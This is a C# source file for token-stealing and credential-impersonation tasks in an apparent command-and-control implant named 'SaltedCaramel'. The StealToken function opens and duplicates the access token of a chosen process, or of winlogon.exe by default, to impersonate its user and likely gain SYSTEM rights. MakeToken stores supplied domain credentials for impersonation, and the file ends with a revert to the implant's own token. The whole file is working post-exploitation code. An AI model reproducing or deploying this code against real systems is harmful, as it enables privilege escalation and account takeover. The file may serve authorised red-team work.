using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;

namespace SaltedCaramel.Tasks
{
    public struct Credential
    {
        public string Domain;
        public string User;
        public string Password;
        public SecureString SecurePassword;
        public bool NetOnly;
    }
    public class Token
    {
        public static IntPtr stolenHandle;
        public static Credential Cred;
        // (username, (password, netonly))

        public static void Execute(SCTask task)
        {
            if (task.command == "steal_token")
            {
                StealToken(task);
            }
            else if (task.command == "make_token")
            {
                MakeToken(task);
            }
        }

        public static void MakeToken(SCTask task)
        {
            // make_token domain user password netonly
            JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
            Cred.Domain = json.Value<string>("domain");
            Cred.User = json.Value<string>("user");
            Cred.Password = json.Value<string>("password");
            if (json.Value<string>("netonly") == "true")
                Cred.NetOnly = true;

            //string first = task.@params.Split(' ')[0];
            //if (first.Contains("\\"))
            //{
            //    Cred.Domain = first.Split('\\')[0];
            //    Cred.User = first.Split('\\')[1];
            //}
            //else
            //{
            //    Cred.Domain = ".";
            //    Cred.User = first;
            //}

            //Cred.Password = task.@params.Split(' ')[1];
            Cred.SecurePassword = new SecureString();
            // Dumb workaround, but we have to do this to make a SecureString
            // out of a string
            foreach (char c in Cred.Password)
            {
                Cred.SecurePassword.AppendChar(c);
            }

            //Cred.NetOnly = false;
            //if (task.@params.Split(' ').Length > 2)
            //{
            //    if (task.@params.Split(' ')[2] == "netonly")
            //        Cred.NetOnly = true;
            //}

            task.status = "complete";
            if (Cred.NetOnly)
                task.message = $"Successfully impersonated {Cred.User} (netonly)";
            else task.message = $"Successfully impersonated {Cred.User}";
        }

        public static void StealToken(SCTask task)
        {
            try
            {
                int procId;
                IntPtr procHandle;
                if (task.@params == "")
                {
                    Process winlogon = Process.GetProcessesByName("winlogon")[0];
                    procHandle = winlogon.Handle;
                    Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
                }
                else
                {
                    procId = Convert.ToInt32(task.@params);
                    procHandle = Process.GetProcessById(procId).Handle;
                    Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
                }

                try
                {
                    // Stores the handle for the original process token
                    stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token

                    // Get handle to target process token
                    bool procToken = Win32.Advapi32.OpenProcessToken(
                        procHandle,                                 // ProcessHandle
                        (uint)TokenAccessLevels.MaximumAllowed,     // desiredAccess
                        out IntPtr tokenHandle);                           // TokenHandle

                    if (!procToken) // Check if OpenProcessToken was successful
                        throw new Exception(Marshal.GetLastWin32Error().ToString());

                    Debug.WriteLine("[+] StealToken - OpenProcessToken: " + procToken);

                    try
                    {
                        // Duplicate token as stolenHandle
                        bool duplicateToken = Win32.Advapi32.DuplicateTokenEx(
                            tokenHandle,                                    // hExistingToken
                            (uint)TokenAccessLevels.MaximumAllowed,         // dwDesiredAccess
                            IntPtr.Zero,                                    // lpTokenAttributes
                            (uint)TokenImpersonationLevel.Impersonation,    // ImpersonationLevel
                            Win32.Advapi32.TOKEN_TYPE.TokenPrimary,         // TokenType
                            out stolenHandle);                              // phNewToken

                        if (!duplicateToken) // Check if DuplicateTokenEx was successful
                            throw new Exception(Marshal.GetLastWin32Error().ToString());

                        Debug.WriteLine("[+] StealToken - DuplicateTokenEx: " + duplicateToken);

                        WindowsIdentity ident = new WindowsIdentity(stolenHandle);
                        Debug.WriteLine("[+] StealToken - Successfully impersonated " + ident.Name);
                        Win32.Kernel32.CloseHandle(tokenHandle);
                        Win32.Kernel32.CloseHandle(procHandle);

                        task.status = "complete";
                        task.message = "Successfully impersonated " + ident.Name;
                        ident.Dispose();
                    }
                    catch (Exception e) // Catch errors thrown by DuplicateTokenEx
                    {
                        Debug.WriteLine("[!] StealToken - ERROR duplicating token: " + e.Message);
                        task.status = "error";
                        task.message = e.Message;
                    }
                }
                catch (Exception e) // Catch errors thrown by OpenProcessToken
                {
                    Debug.WriteLine("[!] StealToken - ERROR creating token handle: " + e.Message);
                    task.status = "error";
                    task.message = e.Message;
                }
            }
            catch (Exception e) // Catch errors thrown by Process.GetProcessById
            {
                Debug.WriteLine("[!] StealToken - ERROR creating process handle: " + e.Message);
                task.status = "error";
                task.message = e.Message;
            }
        }
        public static void Revert()
        {
            if (stolenHandle != IntPtr.Zero)
            {
                Win32.Kernel32.CloseHandle(stolenHandle);
                stolenHandle = IntPtr.Zero;
            }
            else if (Cred.User != null)
            {
                Cred = new Credential();
            }
        }

        public static void Revert(SCTask task)
        {
            if (stolenHandle != IntPtr.Zero)
            {
                Win32.Kernel32.CloseHandle(stolenHandle);
                stolenHandle = IntPtr.Zero;
            }
            else if (Cred.User != null)
            {
                Cred = new Credential();
            }
            task.status = "complete";
            task.message = "Reverted to implant primary token.";
        }
    }
}